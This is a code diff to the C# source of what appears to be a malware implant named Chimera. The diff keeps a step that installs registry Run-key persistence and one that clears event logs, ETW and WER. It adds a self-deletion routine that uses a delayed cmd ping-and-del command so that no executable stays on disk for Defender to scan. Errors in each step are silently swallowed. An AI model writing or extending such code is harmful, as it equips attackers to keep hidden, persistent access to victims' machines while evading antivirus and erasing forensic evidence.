@@ -55,14 +55,27 @@ namespace Chimera
 
             try
             {
-                // 2b. Install HKCU persistence
+                // 2b. Install HKCU persistence (writes agent.dat + Run key)
                 Commands.Persist.Execute();
             }
             catch { }
 
             try
             {
-                // 2c. Clear event logs / ETW / WER
+                // 2c. Self-delete exe from disk — agent.dat handles restarts,
+                //     no PE file left on disk for Defender to scan
+                string self = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                if (!string.IsNullOrEmpty(self) && System.IO.File.Exists(self))
+                {
+                    // Use cmd /c to delete after process releases the handle
+                    Commands.Shell.Execute("cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + self + "\"");
+                }
+            }
+            catch { }
+
+            try
+            {
+                // 2d. Clear event logs / ETW / WER
                 Commands.ClearLogs.Execute();
             }
             catch { }
